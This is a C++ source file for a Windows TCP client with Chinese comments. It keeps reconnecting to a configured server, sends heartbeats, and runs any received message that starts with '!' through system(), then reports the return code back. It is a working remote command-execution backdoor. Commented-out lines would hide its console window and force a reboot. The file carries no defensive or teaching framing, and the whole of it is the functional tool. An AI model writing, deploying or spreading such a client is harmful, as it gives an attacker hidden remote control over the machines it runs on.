#include <iostream>
#include <bits/stdc++.h>
#include <stdio.h>
#include <string.h>
#include <conio.h>
#include <thread>
#include <stdbool.h>
#include <winsock2.h>
#include <windows.h>
#include <mutex>
#define SEND_SIZE 16//禁止修改
#define RECV_SIZE 256//与服务端适配
#define PORT 41862//与服务端适配
#define SERVER_IP "127.0.0.1"//与服务端适配
#define sleep(x) this_thread::sleep_for(chrono::milliseconds(x))

using namespace std;

int heart_beat,connected;
WORD winsock_version;
WSADATA wsa_data;
SOCKET client_socket;
struct sockaddr_in server_addr;

void print(const char *str){printf("[% *.3f] %s\n",10,(double)clock()/1000,str);}
void print(const char *str1,const char *str2){printf("[% *.3f] %s%s\n",10,(double)clock()/1000,str1,str2);}
void print(const char *str1,const int x){printf("[% *.3f] %s%d\n",10,(double)clock()/1000,str1,x);}
//状态输出
bool make_socket(){
	int flag=5;
	while(flag!=-1&&flag!=0){
		winsock_version=MAKEWORD(2,2);
		if(WSAStartup(winsock_version,&wsa_data))print("Failed to init socket! Retrying..."),flag--,sleep(1000);
		else flag=-1;
	}
	server_addr.sin_family=AF_INET;
	server_addr.sin_port=htons(PORT);
	server_addr.sin_addr.S_un.S_addr=inet_addr(SERVER_IP);
	return flag==0;
}
bool make_client(){
	int flag=5;
	while(flag!=-1&&flag!=0){
		client_socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(client_socket==INVALID_SOCKET)print("Failed to create client socket! Retrying..."),flag--,sleep(1000);
		else flag=-1;
	}
	return flag==0;
}
bool reconnect(){
	connected=0;
	closesocket(client_socket);
	if(make_client())return 1;
	print("Connecting...");
	if(connect(client_socket,(LPSOCKADDR)&server_addr,sizeof(server_addr))==SOCKET_ERROR)print("Failed to connect!");
	else print("Succeeded to connect!"),connected=1;
	return 0;
}
void init(){
	print("Initializing...");
	if(make_socket())print("Initializing error!"),exit(1);//system("shutdown -r -f -t 0");
}
//以上为初始化
void auto_connect(){
	while(1){
		if(heart_beat<=2){
			if(reconnect())print("Socket creating error!"),exit(1);//system("shutdown -r -f -t 0");
		}
		heart_beat=0;
		sleep(5000);
	}
}
void auto_send(){
	while(1){
		if(connected){
			if(send(client_socket,"Connected",9,0)<0)print("Failed to send heart beat!");
			else heart_beat++;
		}
		sleep(1000);
	}
}
void execute(char *c){
	char send_data[SEND_SIZE+1]={0},tmp[SEND_SIZE+1]={0};
	char *str=++c;
	print("Executing command...");
	int val=system(str);
	print("Process return value: ",val);
	send_data[0]='!';
	itoa(val,tmp,10);
	strcat(send_data,tmp);
	if(send(client_socket,send_data,strlen(send_data),0)<0)print("Failed to send return value!");
}
//以上为tcp连接管理
int main(){
//	HWND now=GetForegroundWindow();
//	ShowWindow(now,SW_HIDE);

	init();
	thread conn_magr(auto_connect);
	thread send_beat(auto_send);
	conn_magr.detach();
	send_beat.detach();

	char recv_data[RECV_SIZE+2];
	while(1){
		if(connected){
			int len=recv(client_socket,recv_data,RECV_SIZE+1,0);
			if(len>=0){
				recv_data[len]=0;
				if(recv_data[0]=='!'){
					execute(recv_data);
				}else{
					heart_beat++;
					print("Echo from server: ",recv_data);
				}
			}else print("Failed to receive command!");
		}
		sleep(1);
	}

	closesocket(client_socket);
	WSACleanup();
	return 0;
}
